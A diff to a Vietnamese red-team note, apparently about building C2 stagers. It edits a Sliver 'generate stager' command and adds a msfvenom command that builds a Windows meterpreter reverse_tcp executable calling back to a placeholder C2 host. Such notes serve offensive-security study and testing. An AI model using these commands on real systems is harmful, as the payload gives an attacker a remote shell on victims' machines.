@@ -33,8 +33,14 @@ Sliver cho phép ta tạo stager từ nhiều nguồn khác nhau
 
 ### Sliver Framework
 
+```bash
+sliver > generate stager --lhost <c2_host> --lport <c2_port>
 ```
-generate stager --lhost <c2_host> --lport <c2_port> --profile <profile_name> --format exe
+
+### Metasploit
+
+```bash
+msfvenom --platform windows --arch x64 --payload windows/x64/meterpreter/reverse_tcp LHOST=<c2_host> LPORT=<c2_port> EXITFUNC=thread --format exe -o stager.exe
 ```
 
 ### Custom Stager
